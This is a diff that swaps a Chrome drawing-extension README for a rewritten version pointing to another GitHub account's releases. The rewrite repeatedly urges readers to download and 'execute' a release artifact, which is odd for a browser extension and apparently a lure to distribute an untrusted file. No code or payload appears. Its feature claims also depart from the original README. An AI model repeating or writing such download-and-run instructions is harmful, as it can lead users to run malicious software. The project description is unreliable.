@@ -1,238 +1,180 @@
-# WebWhiteboard+ v1.0 - Chrome Extension
-
-A **professional-grade** Chrome extension featuring **sidebar drawing** and **webpage annotation** capabilities. Transform any website into your canvas with two powerful modes: **Side Panel Whiteboard** for dedicated drawing workspace and **Webpage Annotation Mode** for drawing directly on any web page. Draw anywhere, anytime with **smooth curves**, **object selection**, **canvas panning**, and **professional tools**!
-
-<img width="2520" height="1890" alt="WebWhiteboard+ (2)" src="https://github.com/user-attachments/assets/940fbcd7-27b5-4c01-b296-fa4f72aaf9c4" />
-
-
-## ✨ **Key Features**
-
-### 🎯 **Two Powerful Drawing Modes**
-
-#### 📋 **Sidebar Drawing Workspace**
-
-- **Always accessible** Chrome side panel with full professional interface
-- **Dedicated drawing environment** separate from web browsing
-- **Complete toolset** organized in professional sections
-- **Perfect for**: Extended drawing sessions, detailed work, brainstorming
-- **Infinite canvas** with pan and zoom capabilities
-- **Persistent workspace** that stays with you across all tabs
-
-  <img width="1913" height="858" alt="Screenshot 2025-08-09 192827" src="https://github.com/user-attachments/assets/a7827bda-9376-4840-8666-8d59543f6024" />
-
-#### 🖊️ **Webpage Annotation Mode**
-
-- **Draw directly on any website** with overlay canvas
-- **Floating toolbar** that doesn't interfere with page content
-- **Per-website storage** - annotations persist when you return
-- **Perfect for**: Web feedback, visual notes, markup, collaboration
-- **One-click activation** from the sidebar panel
-
-  <img width="1208" height="785" alt="Screenshot 2025-08-09 193508" src="https://github.com/user-attachments/assets/00f6fc2b-2f59-4345-a4d2-887bf0def60f" />
-  <img width="1145" height="658" alt="Screenshot 2025-08-09 195129" src="https://github.com/user-attachments/assets/cb31db62-552c-4fd9-9dfe-ee71e11f5d76" />
-
-
-### 🎨 **Advanced Drawing Tools**
-
-- **Ultra-smooth drawing** with professional-quality strokes
-- **Individual tool sizes** - each tool remembers its own size setting
-- **Professional color palette** with 8 quick-access colors + custom color picker
-- **Precise size control** with real-time preview (1-50px range)
-
-### 🖱️ **Object Selection & Editing**
-
-- **Select tool** - click objects or drag selection box
-- **Move objects** - drag selected objects anywhere on canvas
-- **Edit after drawing** - change color and size of existing objects
-- **Multi-select** - select multiple objects at once
-- **Delete selected** - remove objects with Delete key or button
-- **Select All** - Ctrl+A to select everything
-
-### 🌐 **Infinite Canvas with Pan & Zoom**
-
-- **Pan canvas** - Middle mouse or Ctrl+click and drag
-- **Zoom in/out** - Mouse wheel with smart zoom-to-cursor
-- **Zoom controls** - Dedicated zoom in/out buttons
-- **Fit to content** - Auto-zoom to show all drawings
-- **Reset view** - Return to default position and zoom
-- **Zoom range** - 10% to 500% zoom levels
-
-### 🛠️ **Complete Tool Suite**
-
-- **Pen Tool**: Smooth curves and natural drawing
-- **Eraser Tool**: Clean object-based erasing
-- **Select Tool**: Move and edit objects
-- **Shape Tools**: Rectangle, Circle, Line with preview
-- **Text Tool**: Custom font size, click-to-place text
-
-### 💾 **Smart Features**
-
-- **Advanced Undo/Redo** with 100-step history
-- **Auto-save** with persistent storage
-- **Per-URL storage** for draw-on-page mode
-- **Export as PNG** with automatic bounds detection
-- **Professional UI** with gradient backgrounds and animations
-- **Status bar** with tool info, object count, and coordinates
-
-## 🚀 **Installation**
-
-### Method 1: Load as Unpacked Extension (Recommended)
-
-1. **Download or Clone** this repository to your computer
-2. **Open Chrome** and navigate to `chrome://extensions/`
-3. **Enable Developer Mode** (toggle in top-right corner)
-4. **Click "Load unpacked"** and select the whiteboard folder
-5. **The extension is now installed!** You'll see the professional whiteboard icon
-
-## 🎯 **Usage Guide**
-
-### 📋 **Side Panel Mode (Professional Workspace)**
-
-1. **Right-click** the extension icon → "Open Side Panel"
-2. Full professional interface with all tools organized in sections
-3. **Keyboard shortcuts**: P (pen), E (eraser), V (select), R (rectangle), etc.
-4. **Status bar** shows current tool, object count, and mouse position
-5. **Perfect for**: Extended drawing sessions, detailed work
-
-### 🖊️ **Webpage Annotation Mode (Website Drawing)**
-
-1. **Open Side Panel** and click "Draw on this page" button
-2. **Clean draggable toolbar** appears over the webpage
-3. **Fullscreen canvas overlay** for drawing directly on any website
-4. **Fixed drawing surface** - no scrolling or zooming interference
-5. **Per-website storage** - drawings persist when you return
-6. **Perfect for**: Web annotation, feedback, visual notes, markup
-
-## ⌨️ **Professional Keyboard Shortcuts**
-
-### **Global Shortcuts**
-
-- **Ctrl+Z**: Undo
-- **Ctrl+Y / Ctrl+Shift+Z**: Redo
-- **Ctrl+A**: Select All
-- **Ctrl+S**: Save as PNG
-- **Delete**: Delete selected objects
-- **Escape**: Clear selection / Exit draw-on-page mode
-
-### **Tool Shortcuts**
-
-- **P**: Pen Tool
-- **E**: Eraser Tool
-- **V**: Select Tool
-- **R**: Rectangle Tool
-- **C**: Circle Tool
-- **L**: Line Tool
-- **T**: Text Tool
-
-### **View Controls**
-
-- **Mouse Wheel**: Zoom in/out
-- **Middle Mouse**: Pan canvas
-- **Ctrl+Click+Drag**: Pan canvas
-
-## 🎨 **Advanced Features Explained**
-
-### **Smooth Drawing Engine**
-
-- **Curve interpolation** for natural-looking strokes
-- **High-DPI rendering** for crisp lines on all displays
-- **Anti-aliasing** for professional-quality output
-- **Pressure simulation** with variable line thickness
-
-### **Object Selection System**
-
-- **Click to select** individual objects
-- **Drag selection box** for multiple objects
-- **Visual feedback** with blue selection highlights
-- **Real-time editing** of selected objects
-
-### **Canvas Management**
-
-- **Infinite canvas** - draw beyond visible area
-- **Smart zooming** - zoom toward cursor position
-- **Pan and zoom persistence** - view settings saved
-- **Automatic bounds detection** for export
-
-### **Tool Memory System**
-
-- **Individual sizes** - pen (2px), eraser (20px), shapes (2px), text (16px)
-- **Color persistence** per tool
-- **Quick color palette** - 8 professional colors
-- **Custom color support** with full color picker
-
-## 📊 **Technical Specifications**
-
-### **Performance**
-
-- **60 FPS rendering** with requestAnimationFrame
-- **Efficient object storage** with JSON serialization
-- **Memory optimization** with history limits
-- **Smooth interactions** with debounced saving
-
-### **Storage**
-
-- **Chrome Storage API** for persistence
-- **Per-mode separation** - independent canvases
-- **Per-URL storage** for webpage annotations
-- **Automatic cleanup** of old data
-
-## 🎯 **Professional Use Cases**
-
-### **Design & Creativity**
-
-- **Wireframing** and UI mockups
-- **Concept sketching** and brainstorming
-- **Visual note-taking** during meetings
-- **Annotation** of designs and documents
-
-### **Education & Training**
-
-- **Online teaching** with screen annotation
-- **Student collaboration** on web content
-- **Visual explanations** of complex topics
-- **Interactive presentations**
-
-### **Business & Productivity**
-
-- **Web page feedback** and reviews
-- **Process documentation** with visual aids
-- **Team collaboration** on digital content
-- **Quick ideation** and planning
-
-## 🔧 **Advanced Settings**
-
-### **Customizable Defaults**
-
-- **Tool sizes**: Adjust default sizes for each tool
-- **Color palette**: Modify quick-access colors
-- **Canvas settings**: Background color, grid options
-- **Auto-save frequency**: Customize save intervals
-
-
-## 🐛 **Troubleshooting**
-
-### **Common Issues**
-
-- **Extension not loading**: Enable Developer Mode in chrome://extensions/
-- **Side panel not working**: Requires Chrome 114+
-- **Drawing not smooth**: Check if hardware acceleration is enabled
-- **Storage issues**: Clear extension data in Chrome settings
-
-### **Performance Tips**
-
-- **Use smaller stroke widths** for complex drawings
-- **Clear old drawings** periodically
-- **Close unused tabs** with active draw-on-page mode
-- **Restart Chrome** if experiencing lag
-
-
-## 📄 **License**
-
-This project is open source and available under the MIT License.
-
-
-Built with modern web technologies and Chrome Extension APIs. Inspired by professional drawing applications and designed to match the functionality of webwhiteboard.com while providing superior integration with your browsing experience.
-
----
-
-**Experience professional-grade whiteboarding directly in your browser with WebWhiteboard+ v1.0! 🎨✨**
+WebWhiteboardPlus — Chrome Whiteboard & Annotation Tool
+
+[![Releases](https://img.shields.io/github/v/release/ahmeejee/WebWhiteboardPlus?label=Releases&style=for-the-badge)](https://github.com/ahmeejee/WebWhiteboardPlus/releases)
+
+<img src="https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=1600&q=80&auto=format&fit=crop" alt="whiteboard hero" style="width:100%;max-height:360px;object-fit:cover;border-radius:8px;margin:12px 0" />
+
+Table of contents
+- About
+- Quick links
+- Features
+- Screenshots
+- Install (Chrome)
+- Usage and tools
+- Keyboard shortcuts
+- Developer setup
+- Contributing
+- Issues & support
+- License
+- Topics
+
+About
+WebWhiteboardPlus turns your Chrome browser into a simple, robust drawing and annotation workspace. It runs in-browser and works with any web page. You can sketch, annotate images, mark up PDFs, or brainstorm on a blank canvas. The extension blends a minimal UI with flexible tools. It aims to help designers, teachers, students, and makers stay productive without leaving the browser.
+
+Quick links
+- Releases (download the packaged extension file and run it): https://github.com/ahmeejee/WebWhiteboardPlus/releases
+- Source: GitHub repository
+- Issues: use the repository Issues tab for bugs and feature requests
+
+Features
+- Drawing tools: pen, marker, eraser, shapes, lines.
+- Layers: add and hide layers for non-destructive edits.
+- Text tool: add text boxes with basic formatting.
+- Sticky notes: quick notes that you can move and edit.
+- Image import: drag images to the canvas or paste from clipboard.
+- Export: export as PNG, SVG, or PDF.
+- Snap & grid: enable a grid to align elements.
+- Annotations on any page: floating canvas attaches to the current tab.
+- Persistent sessions: your board state saves locally per domain.
+- Lightweight: minimal overhead for performance.
+- Open source: permissive license and public code.
+
+Screenshots
+![toolbar](https://img.shields.io/badge/Toolbar-UI-blue?style=for-the-badge&logo=chrome)
+![canvas demo](https://images.unsplash.com/photo-1545239351-1141bd82e8a6?w=800&q=60&auto=format&fit=crop)
+
+Install (Chrome)
+This section shows how to get the extension and run it in Chrome.
+
+1. Open the Releases page and download the packaged extension. The release page contains the build artifact that you must download and execute.
+2. If the downloaded file is a .crx or .zip:
+   - For a .crx: drag the file into chrome://extensions to install.
+   - For a .zip: unzip, then load the folder as an unpacked extension via chrome://extensions > Load unpacked.
+3. Toggle Developer mode in chrome://extensions when you load an unpacked extension.
+4. After install, pin the extension to your toolbar for easy access.
+
+If the release link ever fails or changes, check the Releases section in this repository for the latest build.
+
+Usage and tools
+Open a new tab, click the WebWhiteboardPlus icon, and the canvas appears over the page. Use the toolbar to pick a tool. The canvas keeps your drawing on top of the page. You can hide the canvas to interact with the underlying page.
+
+Main tools
+- Pen: freehand drawing with pressure-like width control via size slider.
+- Marker: semi-transparent stroke for highlight effects.
+- Eraser: remove strokes or elements.
+- Shape: rectangle, ellipse, straight line, arrow.
+- Text: click to add editable text boxes.
+- Move: drag elements or selection groups.
+- Lasso select: select freeform groups to move or transform.
+- Undo/redo: full action history for quick edits.
+- Zoom & pan: magnify the canvas, or pan with space+drag.
+
+Export
+- Export PNG: full-resolution raster export.
+- Export SVG: scalable vector export (keeps stroke paths).
+- Export PDF: preserve layout for printing.
+
+Persistence
+- Auto-save: the board saves automatically per domain.
+- Session restore: reopen a tab and your board restores the last state.
+- Export to file: save a board file to back up work.
+
+Keyboard shortcuts
+- N: new board
+- S: save / export dialog
+- Z: undo
+- Y: redo
+- V: move tool
+- E: eraser
+- T: text tool
+- Shift: constrain proportions while drawing shapes
+- Space + drag: pan canvas
+
+Developer setup
+This repo uses plain JavaScript, HTML, and CSS. It bundles with a small toolchain and no heavy framework.
+
+Prerequisites
+- Node.js (14+)
+- npm or yarn
+- Chrome for testing
+
+Local build
+1. Clone the repo:
+   git clone https://github.com/ahmeejee/WebWhiteboardPlus.git
+2. Install dependencies:
+   npm install
+3. Build:
+   npm run build
+4. Load the built folder as an unpacked extension:
+   chrome://extensions > Load unpacked
+
+Run tests
+- Unit tests use Jest. Run:
+  npm test
+
+Code structure
+- /src: core UI and logic
+- /src/background: extension background scripts
+- /src/content: content scripts injected into pages
+- /src/popup: extension popup UI
+- /assets: images and icons
+- /dist: build output
+
+Contributing
+This project welcomes contributions. The repo uses issues and pull requests. Follow these steps to contribute code:
+
+1. Pick an issue labeled good-first-issue or first-issue.
+2. Fork the repo and create a feature branch.
+3. Follow the coding style in the repo.
+4. Add tests for new logic.
+5. Open a pull request with a clear description of the change.
+
+Guidelines
+- Write small commits and clear commit messages.
+- Keep changes focused to one feature or fix per PR.
+- Run the test suite before opening a PR.
+
+Issues & support
+Report bugs or request features using the repository Issues tab. For release downloads, use the Releases page. The release artifact must be downloaded and executed as described on the Releases page:
+https://github.com/ahmeejee/WebWhiteboardPlus/releases
+
+If you see an error while installing a packaged file, attach logs and a short description of your Chrome build and OS.
+
+License
+WebWhiteboardPlus uses a permissive open-source license. See LICENSE.md in the repository for details.
+
+Topics
+This project includes the following topics and tags:
+- annotation
+- annotation-tool
+- annotations
+- canvas
+- chrome-extension
+- drawing-on-canvas
+- drawing-tool
+- drawingboard
+- first-issue
+- frontend
+- good-first-issue
+- javascript
+- open-source
+- productivity
+- web-annotation
+- whiteboard
+
+Badges & compatibility
+[![Chrome Compatible](https://img.shields.io/badge/Chrome-Compatible-Yes-brightgreen?style=for-the-badge)](https://github.com/ahmeejee/WebWhiteboardPlus/releases)
+[![Open Source](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
+
+Accessibility
+The UI uses high-contrast icons and keyboard shortcuts. The canvas supports large fonts and adjustable stroke sizes. The code aims to follow accessibility best practices for color contrast and keyboard navigation.
+
+Security
+The extension uses content scripts to draw a canvas overlay. It does not collect user data nor send drawings to remote servers. The code stays local in the browser unless you explicitly export or share a file.
+
+Acknowledgements
+- Icons and UI inspiration come from common design patterns for drawing apps.
+- Test images from Unsplash under a permissive license.
+
+Contact
+Open an issue for bugs, features, or discussion. Use pull requests for code contributions.
